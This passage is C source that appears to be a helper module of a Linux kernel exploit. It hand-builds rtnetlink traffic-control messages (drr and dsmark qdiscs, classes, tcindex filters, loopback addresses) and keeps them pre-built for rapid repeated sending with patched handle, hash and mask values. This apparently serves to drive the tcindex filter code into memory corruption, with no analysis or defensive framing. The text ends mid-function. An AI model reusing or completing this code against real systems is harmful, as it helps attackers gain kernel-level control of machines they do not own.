#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <asm/types.h>
#include <linux/if_link.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_cls.h>
#include <linux/if.h>

#include "util.h"
#include "usched.h"

#define U_SET_FILTER_HANDLE 9

#define TB_IFLA_IFNAME_SIZE NLA_ALIGN(sizeof(struct nlattr) + IFNAMSIZ)
#define GET_LINK_SIZE (NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(struct ifinfomsg)) + TB_IFLA_IFNAME_SIZE)
#define SET_LINK_SIZE (NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(struct ifinfomsg)))

#define TCA_KIND_SIZE NLA_ALIGN(sizeof(struct nlattr) + 8)
#define NEW_DRR_QDISC_SIZE (NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(struct tcmsg)) + TCA_KIND_SIZE)

#define NEW_DS_QDISC_TCA_OPTIONS_SIZE (sizeof(struct nlattr) + 8)
#define NEW_DS_QDISC_SIZE (NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(struct tcmsg)) + TCA_KIND_SIZE + NEW_DS_QDISC_TCA_OPTIONS_SIZE)

#define ADD_CLASS_SIZE (NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(struct tcmsg)) + sizeof(struct nlattr))
#define DEL_CLASS_SIZE (NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(struct tcmsg)))

#define SET_FILTER_INC_TCA_OPTIONS_SIZE (sizeof(struct nlattr) + 24)
#define SET_FILTER_INC_SIZE (NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(struct tcmsg)) + TCA_KIND_SIZE + SET_FILTER_INC_TCA_OPTIONS_SIZE)

#define SET_FILTER_CLEAN_TCA_OPTIONS_SIZE (sizeof(struct nlattr) + 16)
#define SET_FILTER_CLEAN_SIZE (NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(struct tcmsg)) + TCA_KIND_SIZE + SET_FILTER_CLEAN_TCA_OPTIONS_SIZE)

#define SET_FILTER_DEL_SIZE (NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(struct tcmsg)))

#define SET_ADDR_ADD_SIZE (NLMSG_HDRLEN + NLA_ALIGN(sizeof(struct ifaddrmsg)) + 16)
#define SET_ADDR_DEL_SIZE (NLMSG_HDRLEN + NLA_ALIGN(sizeof(struct ifaddrmsg)) + 16)

#define NLA_ATTR(attr) ((void *)attr + NLA_HDRLEN)

static char g_inc_buf[SET_FILTER_INC_SIZE];
static struct sockaddr_nl g_inc_dest_snl;
static struct iovec g_inc_iov;
static struct msghdr g_inc_msg;

static char g_clean_buf[SET_FILTER_CLEAN_SIZE];
static struct sockaddr_nl g_clean_dest_snl;
static struct iovec g_clean_iov;
static struct msghdr g_clean_msg;

static char g_del_buf[SET_FILTER_DEL_SIZE];
static struct sockaddr_nl g_del_dest_snl;
static struct iovec g_del_iov;
static struct msghdr g_del_msg;

static char g_cl_add_buf[ADD_CLASS_SIZE];
static struct sockaddr_nl g_cl_add_dest_snl;
static struct iovec g_cl_add_iov;
static struct msghdr g_cl_add_msg;

static char g_cl_del_buf[DEL_CLASS_SIZE];
static struct sockaddr_nl g_cl_del_dest_snl;
static struct iovec g_cl_del_iov;
static struct msghdr g_cl_del_msg;

static char g_addr_add_buf[SET_ADDR_ADD_SIZE];
static struct sockaddr_nl g_addr_add_dest_snl;
static struct iovec g_addr_add_iov;
static struct msghdr g_addr_add_msg;

static char g_addr_del_buf[SET_ADDR_DEL_SIZE];
static struct sockaddr_nl g_addr_del_dest_snl;
static struct iovec g_addr_del_iov;
static struct msghdr g_addr_del_msg;

int g_tc_fd;
int g_tc_linkid;

/**
 * set_str_attr(): Prepare a 8bytes of string netlink attribute
 * @attr: Attribute to fill
 * @type: Type of the attribute
 * @name: Buffer to copy into the attribute
 */
static struct nlattr *set_str_attr(struct nlattr *attr, uint16_t type, char *name)
{
    int len = sizeof(struct nlattr) + strlen(name) + 1;
    attr->nla_type = type;
    attr->nla_len = NLA_ALIGN(len);
    memcpy(NLA_ATTR(attr), name, strlen(name) + 1);

    return (void *)attr + NLA_ALIGN(len);
}

/**
 * set_u32_attr(): Prepare an integer netlink attribute
 * @attr: Attribute to fill
 * @type: Type of the attribute
 * @value: Value of this attribute
 */
static struct nlattr *set_u32_attr(struct nlattr *attr, uint16_t type, uint32_t value)
{
    attr->nla_type = type;
    attr->nla_len = sizeof(uint32_t) + sizeof(struct nlattr);
    *(uint32_t *)NLA_ATTR(attr) = (value);

    return (void *)attr + sizeof(uint32_t) + sizeof(struct nlattr);
}

/**
 * set_u16_attr(): Prepare an integer netlink attribute
 * @attr: Attribute to fill
 * @type: Type of the attribute
 * @value: Value of this attribute
 */
static struct nlattr *set_u16_attr(struct nlattr *attr, uint16_t type, uint16_t value)
{
    attr->nla_type = type;
    attr->nla_len = NLA_ALIGN(sizeof(uint16_t) + sizeof(struct nlattr));
    *(uint16_t *)NLA_ATTR(attr) = (value);

    return (void *)attr + NLA_ALIGN(sizeof(uint16_t) + sizeof(struct nlattr));
}

/**
 * set_nested_attr(): Prepare a nested netlink attribute
 * @attr: Attribute to fill
 * @type: Type of the nested attribute
 * @data_len: Length of the nested attribute
 */
static struct nlattr *set_nested_attr(struct nlattr *attr, uint16_t type, uint16_t data_len)
{
    attr->nla_type = type;
    attr->nla_len = (data_len + sizeof(struct nlattr));
    return (void *)attr + sizeof(struct nlattr);
}

/**
 * rt_getlink(): get link information 
 * @sock: socket bound to the route table netlink
 * @link_name: name of the link (eth0, enp0s33, lo, tunl0, etc)
*/
int rt_getlink(int sock, char *link_name)
{
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov;
    struct nlmsghdr *nlh;
    struct ifinfomsg *ifm;
    struct nlattr *tb;
    int ret;
    char buf_recv[BUF_SIZE];
    char self_buf[GET_LINK_SIZE];

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;

    /* route table netlink table message preparation */
    memset(self_buf, 0, sizeof(self_buf));
    nlh = (struct nlmsghdr *)self_buf;
    nlh->nlmsg_len = GET_LINK_SIZE;
    nlh->nlmsg_type = RTM_GETLINK; // rtnl_getlink
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_REQUEST; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // infomation
    ifm = NLMSG_DATA(nlh);
    ifm->ifi_family = AF_UNSPEC;

    /* prepare asociated attribute */
    tb = (void *)ifm + NLMSG_ALIGN(sizeof(struct ifinfomsg));
    tb = set_str_attr(tb, IFLA_IFNAME, link_name);

    /* IOV preparation */
    memset(&iov, 0, sizeof(iov));
    iov.iov_base = (void *)nlh;
    iov.iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    memset(&msg, 0, sizeof(msg));
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    ret = sendmsg(sock, &msg, 0);
    if (ret < 0)
        errExit("[-] rt_getlink sendmsg");

    /* receive message */
    memset(buf_recv, 0, sizeof(buf_recv));
    memset(&iov, 0, sizeof(iov));
    memset(&msg, 0, sizeof(msg));
    iov.iov_base = (void *)buf_recv;
    iov.iov_len = sizeof(buf_recv);
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    ret = recvmsg(sock, &msg, 0);
    if (ret < 0)
        errExit("[-] rt_getlink recvmsg");

    // hexdump(buf_recv, 0x200);
    ifm = NLMSG_DATA(buf_recv);
    printf("\t[+] Get ip link dev %s with ifi_index: 0x%x\n", link_name, ifm->ifi_index);

    /* Receive message */
    return ifm->ifi_index;
}

/**
 * rt_setlink(): set the exist link 
 * @sock: socket bound to the route table netlink
 * @link_id: identify link
*/
void rt_setlink(int sock, unsigned int link_id)
{

    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov;
    struct nlmsghdr *nlh;
    struct ifinfomsg *ifm;
    int ret;
    char self_buf[SET_LINK_SIZE];

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;

    /* route table netlink table message preparation */
    memset(self_buf, 0, sizeof(self_buf));
    nlh = (struct nlmsghdr *)self_buf;
    nlh->nlmsg_len = SET_LINK_SIZE;
    nlh->nlmsg_type = RTM_SETLINK; // rtnl_setlink
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // infomation
    ifm = NLMSG_DATA(nlh);
    ifm->ifi_family = AF_UNSPEC;
    ifm->ifi_index = link_id;
    ifm->ifi_flags = IFF_MULTICAST | IFF_BROADCAST | IFF_UP; // IFF_MULTICAST IFF_DEBUG IFF_UP

    /* IOV preparation */
    memset(&iov, 0, sizeof(iov));
    iov.iov_base = (void *)nlh;
    iov.iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    memset(&msg, 0, sizeof(msg));
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    ret = sendmsg(sock, &msg, 0);
    if (ret < 0)
        errExit("[-] rt_setlink sendmsg");
    printf("\t[+] Set ip link 0x%x up done\n", link_id);
}

/**
 * rt_newqdisc(): create new queue discipline
 * @sock: socket bound to the route table netlink
 * @link_id: identify link
 * @hanle: qdisc hanlde
*/
void rt_newqdisc_drr(int sock, unsigned int link_id, unsigned int handle)
{
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov;
    struct nlmsghdr *nlh = NULL;
    struct nlattr *tca;
    struct tcmsg *tcm;
    int ret;
    char self_buf[NEW_DRR_QDISC_SIZE];

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;

    /* route table netlink table message preparation */
    memset(self_buf, 0, sizeof(self_buf));
    nlh = (struct nlmsghdr *)self_buf;
    nlh->nlmsg_len = NEW_DRR_QDISC_SIZE;
    nlh->nlmsg_type = RTM_NEWQDISC; // tc_modify_qdisc
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_CREATE | NLM_F_REQUEST | NLM_F_REPLACE; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // Attribute failed policy validation
    tcm = NLMSG_DATA(nlh);
    tcm->tcm_ifindex = link_id; // TCM_IFINDEX_MAGIC_BLOCK
    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_parent = U_DS_QDISC_HANDLE; // clid = TC_H_ROOT = 0xFFFFFFFF , TC_H_INGRESS    (0xFFFFFFF1)
    tcm->tcm_handle = handle;    // 0xffff0000 0x10000 1:0 qdisc handle  --> need if (tcm->tcm_handle)  -> fail

    /* prepare asociated attribute */
    tca = (void *)tcm + NLMSG_ALIGN(sizeof(struct tcmsg));
    tca = set_str_attr(tca, TCA_KIND, U_QDISC_KIND);

    /* IOV preparation */
    memset(&iov, 0, sizeof(iov));
    iov.iov_base = (void *)nlh;
    iov.iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    memset(&msg, 0, sizeof(msg));
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    ret = sendmsg(sock, &msg, 0);
    if (ret < 0)
        errExit("[-] rt_newqdisc_drr sendmsg");
    printf("\t[+] Create qdisc dev 0x%x handle 0x%x parent 0x%x drr done\n", link_id, U_QDISC_HANDLE, U_DS_QDISC_HANDLE);
}

/**
 * rt_newqdisc(): create new queue discipline
 * @sock: socket bound to the route table netlink
 * @link_id: identify link
 * @hanle: qdisc hanlde
*/
void rt_newqdisc_ds(int sock, unsigned int link_id, unsigned int handle)
{
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov;
    struct nlmsghdr *nlh = NULL;
    struct nlattr *tca;
    struct tcmsg *tcm;
    int ret;
    char self_buf[NEW_DS_QDISC_SIZE];

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;

    /* route table netlink table message preparation */
    memset(self_buf, 0, sizeof(self_buf));
    nlh = (struct nlmsghdr *)self_buf;
    nlh->nlmsg_len = NEW_DS_QDISC_SIZE;
    nlh->nlmsg_type = RTM_NEWQDISC; // tc_modify_qdisc
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_CREATE | NLM_F_REQUEST | NLM_F_REPLACE; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // Attribute failed policy validation
    tcm = NLMSG_DATA(nlh);
    tcm->tcm_ifindex = link_id; // TCM_IFINDEX_MAGIC_BLOCK
    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_parent = 0xFFFFFFFF; // clid = TC_H_ROOT = 0xFFFFFFFF , TC_H_INGRESS    (0xFFFFFFF1)
    tcm->tcm_handle = handle;    // 0xffff0000 0x10000 1:0 qdisc handle  --> need if (tcm->tcm_handle)  -> fail

    /* prepare asociated attribute */
    tca = (void *)tcm + NLMSG_ALIGN(sizeof(struct tcmsg));
    tca = set_str_attr(tca, TCA_KIND, U_DS_KIND);
    tca = set_nested_attr(tca, TCA_OPTIONS, 8);
    tca = set_u16_attr(tca, TCA_DSMARK_INDICES, 64);

    /* IOV preparation */
    memset(&iov, 0, sizeof(iov));
    iov.iov_base = (void *)nlh;
    iov.iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    memset(&msg, 0, sizeof(msg));
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    ret = sendmsg(sock, &msg, 0);
    if (ret < 0)
        errExit("[-] rt_newqdisc_ds sendmsg");
    printf("\t[+] Create qdisc dev 0x%x handle 0x%x root dsmark done\n", link_id, handle);
}

/**
 * rt_addclass(): add class
 * @sock: socket bound to the route table netlink
 * @link_id: identify link
 * @handle: idenfity class 
*/
void rt_setclass_add(unsigned int link_id)
{
    struct nlmsghdr *nlh;
    struct nlattr *tca;
    struct tcmsg *tcm;
    int ret;

    /* Destination preparation */
    memset(&g_cl_add_dest_snl, 0, sizeof(struct sockaddr_nl));
    g_cl_add_dest_snl.nl_family = AF_NETLINK;

    /* route table netlink table message preparation */
    memset(g_cl_add_buf, 0, sizeof(g_cl_add_buf));
    nlh = (struct nlmsghdr *)g_cl_add_buf;
    nlh->nlmsg_len = ADD_CLASS_SIZE;
    nlh->nlmsg_type = RTM_NEWTCLASS; // tc_ctl_tclass
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_CREATE | NLM_F_REQUEST; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // Attribute failed policy validation
    tcm = NLMSG_DATA(nlh);
    tcm->tcm_ifindex = link_id; // TCM_IFINDEX_MAGIC_BLOCK
    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_parent = U_QDISC_HANDLE; // clid = TC_H_ROOT = 0xFFFFFFFF , TC_H_INGRESS    (0xFFFFFFF1)
    tcm->tcm_handle = 0;    // 0xffff0000 0x10000 1:0 qdisc handle  --> need if (tcm->tcm_handle)  -> fail

    /* prepare asociated attribute */
    tca = (void *)tcm + NLMSG_ALIGN(sizeof(struct tcmsg));
    tca = set_nested_attr(tca, TCA_OPTIONS, 0);

    /* IOV preparation */
    memset(&g_cl_add_iov, 0, sizeof(g_cl_add_iov));
    g_cl_add_iov.iov_base = (void *)nlh;
    g_cl_add_iov.iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    memset(&g_cl_add_msg, 0, sizeof(g_cl_add_msg));
    g_cl_add_msg.msg_name = (void *)&g_cl_add_dest_snl;
    g_cl_add_msg.msg_namelen = sizeof(struct sockaddr_nl);
    g_cl_add_msg.msg_iov = &g_cl_add_iov;
    g_cl_add_msg.msg_iovlen = 1;

    // ret = sendmsg(sock, &msg, 0);
    // if (ret < 0)
    //     errExit("[-] rt_addclass sendmsg");
    // printf("\t[+] Add class dev 0x%x parent 0x%x handle 0x%x drr done\n", 
    //             link_id, U_QDISC_HANDLE, handle);
}

void send_add_class(unsigned int handle)
{
    int ret;

    *(uint32_t *)(g_cl_add_buf + 24) = handle;
    ret = sendmsg(g_tc_fd, &g_cl_add_msg, 0);
    if (ret < 0)
        errExit("[-] sendmsg to add class");
}

/**
 * rt_delclass(): delte existing class
 * @sock: socket bound to the route table netlink
 * @link_id: identify link
 * @handle: idenfity class 
*/
void rt_setclass_del(unsigned int link_id)
{
    struct nlmsghdr *nlh;
    struct tcmsg *tcm;
    int ret;

    /* Destination preparation */
    memset(&g_cl_del_dest_snl, 0, sizeof(struct sockaddr_nl));
    g_cl_del_dest_snl.nl_family = AF_NETLINK;

    /* route table netlink table message preparation */
    memset(g_cl_del_buf, 0, sizeof(g_cl_del_buf));
    nlh = (struct nlmsghdr *)g_cl_del_buf;
    nlh->nlmsg_len = DEL_CLASS_SIZE;
    nlh->nlmsg_type = RTM_DELTCLASS; // tc_ctl_tclass
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_CREATE | NLM_F_REQUEST; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // Attribute failed policy validation
    tcm = NLMSG_DATA(nlh);
    tcm->tcm_ifindex = link_id; // TCM_IFINDEX_MAGIC_BLOCK
    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_parent = U_QDISC_HANDLE; // clid = TC_H_ROOT = 0xFFFFFFFF , TC_H_INGRESS    (0xFFFFFFF1)
    tcm->tcm_handle = 0;    // 0xffff0000 0x10000 1:0 qdisc handle  --> need if (tcm->tcm_handle)  -> fail

    /* IOV preparation */
    memset(&g_cl_del_iov, 0, sizeof(g_cl_del_iov));
    g_cl_del_iov.iov_base = (void *)nlh;
    g_cl_del_iov.iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    memset(&g_cl_del_msg, 0, sizeof(g_cl_del_msg));
    g_cl_del_msg.msg_name = (void *)&g_cl_del_dest_snl;
    g_cl_del_msg.msg_namelen = sizeof(struct sockaddr_nl);
    g_cl_del_msg.msg_iov = &g_cl_del_iov;
    g_cl_del_msg.msg_iovlen = 1;

    // ret = sendmsg(sock, &msg, 0);
    // if (ret < 0)
    //     errExit("[-] rt_delclass sendmsg");
    // printf("[+] Del class dev 0x%x parent 0x%x handle 0x%x drr done\n", 
    //             link_id, U_QDISC_HANDLE, handle);
}

void send_del_class(unsigned int handle)
{
    int ret;

    *(uint32_t *)(g_cl_del_buf + 24) = handle;
    ret = sendmsg(g_tc_fd, &g_cl_del_msg, 0);
    if (ret < 0)
        errExit("[-] sendmsg to del class");
}

/**
 * rt_setfilter(): set tcindex filter operations
 * @sock: socket bound to the route table netlink
 * @link_id: identify id of the link network
 */
void rt_setfilter_inc(unsigned int link_id)
{
    struct nlmsghdr *nlh;
    struct nlattr *tca;
    struct tcmsg *tcm;
    int prio, proto;
    int ret;

    /* Destination preparation */
    memset(&g_inc_dest_snl, 0, sizeof(struct sockaddr_nl));
    g_inc_dest_snl.nl_family = AF_NETLINK;

    /* route table netlink table message preparation */
    memset(g_inc_buf, 0, sizeof(g_inc_buf));
    nlh = (struct nlmsghdr *)g_inc_buf;
    nlh->nlmsg_len = SET_FILTER_INC_SIZE;
    nlh->nlmsg_type = RTM_NEWTFILTER; // tc_new_tfilter
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_REPLACE; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // Attribute failed policy validation
    tcm = NLMSG_DATA(nlh);
    tcm->tcm_ifindex = link_id; // TCM_IFINDEX_MAGIC_BLOCK
    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_parent = U_QDISC_HANDLE;
    tcm->tcm_handle = U_SET_FILTER_HANDLE;
    prio = 1;
    proto = 0x300; // cmp    ax, 0x300 -> ETH_P_ALL
    tcm->tcm_info = (prio << 16) | (proto); // prio | protocol

    tca = (void *)tcm + NLMSG_ALIGN(sizeof(struct tcmsg));
    tca = set_str_attr(tca, TCA_KIND, U_FILTER_KIND);
    tca = set_nested_attr(tca, TCA_OPTIONS, 24);
    tca = set_u32_attr(tca, TCA_TCINDEX_HASH, 16); // hash 16
    tca = set_u16_attr(tca, TCA_TCINDEX_MASK, 15); // mask 15
    tca = set_u32_attr(tca, TCA_TCINDEX_CLASSID, U_CLASS_HANDLE); // classid 1:1
    // tc filter add dev lo parent 1: handle 9 prio 1 tcindex hash 16 mask 15 classid 1:1

    /* IOV preparation */
    memset(&g_inc_iov, 0, sizeof(g_inc_iov));
    g_inc_iov.iov_base = (void *)nlh;
    g_inc_iov.iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    memset(&g_inc_msg, 0, sizeof(g_inc_msg));
    g_inc_msg.msg_name = (void *)&g_inc_dest_snl;
    g_inc_msg.msg_namelen = sizeof(struct sockaddr_nl); // tc_new_tfilter
    g_inc_msg.msg_iov = &g_inc_iov;
    g_inc_msg.msg_iovlen = 1;

    //ret = sendmsg(sock, &msg, 0);
    //if (ret < 0)
    //    errExit("[-] rt_setfilter_inc sendmsg");
    //printf("[+] Set filter inc once done\n");
}

void send_inc_filter(unsigned int handle)
{
    int ret;
    uint16_t mask;

    // little trick to make mask useful with 0x100 handle 
    // in which we will use the tc_index classify
    if (handle == 0x100)
        mask = 0xff;
    else
        mask = handle;

    *(uint32_t *)(g_inc_buf + 24) = handle;     // handle
    *(uint32_t *)(g_inc_buf + 56) = handle + 1; // hash
    *(uint16_t *)(g_inc_buf + 64) = mask;       // mask

    ret = sendmsg(g_tc_fd, &g_inc_msg, 0);
    if (ret < 0)
        errExit("[-] sendmsg to inc filter");
}

/**
 * rt_setfilter(): set tcindex filter operations
 * @sock: socket bound to the route table netlink
 * @link_id: identify id of the link network
 */
void rt_setfilter_clean(unsigned int link_id)
{
    struct nlmsghdr *nlh;
    struct nlattr *tca;
    struct tcmsg *tcm;
    int prio, proto;
    int ret;

    /* Destination preparation */
    memset(&g_clean_dest_snl, 0, sizeof(struct sockaddr_nl));
    g_clean_dest_snl.nl_family = AF_NETLINK;

    /* route table netlink table message preparation */
    memset(g_clean_buf, 0, sizeof(g_clean_buf));
    nlh = (struct nlmsghdr *)g_clean_buf;
    nlh->nlmsg_len = SET_FILTER_CLEAN_SIZE;
    nlh->nlmsg_type = RTM_NEWTFILTER; // tc_new_tfilter
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_REPLACE; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // Attribute failed policy validation
    tcm = NLMSG_DATA(nlh);
    tcm->tcm_ifindex = link_id; // TCM_IFINDEX_MAGIC_BLOCK
    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_parent = U_QDISC_HANDLE;
    tcm->tcm_handle = 0;
    prio = 1;
    proto = 0x300; // cmp    ax, 0x300 -> ETH_P_ALL
    tcm->tcm_info = (prio << 16) | (proto); // prio | protocol

    tca = (void *)tcm + NLMSG_ALIGN(sizeof(struct tcmsg));
    tca = set_str_attr(tca, TCA_KIND, U_FILTER_KIND);
    tca = set_nested_attr(tca, TCA_OPTIONS, 16);
    tca = set_u32_attr(tca, TCA_TCINDEX_HASH, 1); // hash 8
    tca = set_u16_attr(tca, TCA_TCINDEX_MASK, 0); // mask 7
    // tc filter replace dev lo parent 1: prio 1 tcindex hash 8 mask 7

    /* IOV preparation */
    memset(&g_clean_iov, 0, sizeof(g_clean_iov));
    g_clean_iov.iov_base = (void *)nlh;
    g_clean_iov.iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    memset(&g_clean_msg, 0, sizeof(g_clean_msg));
    g_clean_msg.msg_name = (void *)&g_clean_dest_snl;
    g_clean_msg.msg_namelen = sizeof(struct sockaddr_nl); // tc_new_tfilter
    g_clean_msg.msg_iov = &g_clean_iov;
    g_clean_msg.msg_iovlen = 1;

    //ret = sendmsg(sock, &msg, 0);
    //if (ret < 0)
    //    errExit("[-] rt_setfilter_clean sendmsg");
    //printf("[+] Set filter clean once done\n");
}

void send_clean_filter(void)
{
    int ret;

    ret = sendmsg(g_tc_fd, &g_clean_msg, 0);
    if (ret < 0)
        errExit("[-] sendmsg to clean filter");
}

/**
 * rt_delfilter(): delete tcindex filter operations
 * @sock: socket bound to the route table netlink
 * @link_id: identify id of the link network
 * @handle: filter handle, using for identify in the list of many filers
 */
void rt_setfilter_del(unsigned int link_id)
{
    struct nlmsghdr *nlh;
    struct tcmsg *tcm;
    int prio, proto;
    int ret;

    /* Destination preparation */
    memset(&g_del_dest_snl, 0, sizeof(struct sockaddr_nl));
    g_del_dest_snl.nl_family = AF_NETLINK;

    /* route table netlink table message preparation */
    memset(g_del_buf, 0, sizeof(g_del_buf));
    nlh = (struct nlmsghdr *)g_del_buf;
    nlh->nlmsg_len = SET_FILTER_DEL_SIZE;
    nlh->nlmsg_type = RTM_DELTFILTER; // tc_del_tfilter
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_REQUEST; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // Attribute failed policy validation
    tcm = NLMSG_DATA(nlh);
    tcm->tcm_ifindex = link_id; // TCM_IFINDEX_MAGIC_BLOCK
    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_parent = U_QDISC_HANDLE;
    tcm->tcm_handle = 0;
    prio = 1;
    proto = 0x300; // cmp    ax, 0x300 -> ETH_P_ALL
    tcm->tcm_info = (prio << 16) | (proto); // prio | protocol

    /* IOV preparation */
    memset(&g_del_iov, 0, sizeof(struct iovec));
    g_del_iov.iov_base = (void *)nlh;
    g_del_iov.iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    memset(&g_del_msg, 0, sizeof(g_del_msg));
    g_del_msg.msg_name = (void *)&g_del_dest_snl;
    g_del_msg.msg_namelen = sizeof(struct sockaddr_nl); // tc_new_tfilter
    g_del_msg.msg_iov = &g_del_iov;
    g_del_msg.msg_iovlen = 1;
}

void send_del_filter(unsigned int handle)
{
    int ret;

    *(uint32_t *)(g_del_buf + 24) = handle;     // handle

    ret = sendmsg(g_tc_fd, &g_del_msg, 0);
    if (ret < 0)
        errExit("[-] sendmsg to del filter");
}

void send_destory_filter(void)
{
    int ret;

    *(uint32_t *)(g_del_buf + 24) = 0;     // handle

    ret = sendmsg(g_tc_fd, &g_del_msg, 0);
    if (ret < 0)
        errExit("[-] sendmsg to del filter");
}

void rt_setaddr_add(unsigned int link_id)
{
    struct nlmsghdr *nlh;
    struct ifaddrmsg *ifm;
    struct nlattr *tca;
    int ret;

    /* Destination preparation */
    memset(&g_addr_add_dest_snl, 0, sizeof(struct sockaddr_nl));
    g_addr_add_dest_snl.nl_family = AF_NETLINK;

    /* route table netlink table message preparation */
    memset(g_addr_add_buf, 0, sizeof(g_addr_add_buf));
    nlh = (struct nlmsghdr *)g_addr_add_buf;
    nlh->nlmsg_len = SET_ADDR_ADD_SIZE;
    nlh->nlmsg_type = RTM_NEWADDR; // tc_del_tfilter
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // Attribute failed policy validation
    ifm = NLMSG_DATA(nlh);
    ifm->ifa_family = AF_INET;
    ifm->ifa_prefixlen = 32;
    ifm->ifa_flags = 0;
    ifm->ifa_scope = RT_SCOPE_HOST;
    ifm->ifa_index = link_id;

    tca = (void *)ifm + NLMSG_ALIGN(sizeof(struct ifaddrmsg));
    tca = set_u32_attr(tca, IFA_LOCAL, 0x200007f); // 127.0.0.2
    tca = set_u32_attr(tca, IFA_ADDRESS, 0x200007f); // 127.0.0.2

    /* IOV preparation */
    memset(&g_addr_add_iov, 0, sizeof(struct iovec));
    g_addr_add_iov.iov_base = (void *)nlh;
    g_addr_add_iov.iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    memset(&g_addr_add_msg, 0, sizeof(g_addr_add_msg));
    g_addr_add_msg.msg_name = (void *)&g_addr_add_dest_snl;
    g_addr_add_msg.msg_namelen = sizeof(struct sockaddr_nl); // tc_new_tfilter
    g_addr_add_msg.msg_iov = &g_addr_add_iov;
    g_addr_add_msg.msg_iovlen = 1;
}

void send_add_addr(void)
{
    int ret;

    ret = sendmsg(g_tc_fd, &g_addr_add_msg, 0);
    if (ret < 0)
        errExit("[-] sendmsg to add addr");
}

void rt_setaddr_del(unsigned int link_id)
{
    struct nlmsghdr *nlh;
    struct ifaddrmsg *ifm;
    struct nlattr *tca;
    int ret;

    /* Destination preparation */
    memset(&g_addr_del_dest_snl, 0, sizeof(struct sockaddr_nl));
    g_addr_del_dest_snl.nl_family = AF_NETLINK;

    /* route table netlink table message preparation */
    memset(g_addr_del_buf, 0, sizeof(g_addr_del_buf));
    nlh = (struct nlmsghdr *)g_addr_del_buf;
    nlh->nlmsg_len = SET_ADDR_DEL_SIZE;
    nlh->nlmsg_type = RTM_DELADDR; // tc_del_tfilter
    nlh->nlmsg_pid = getpid();
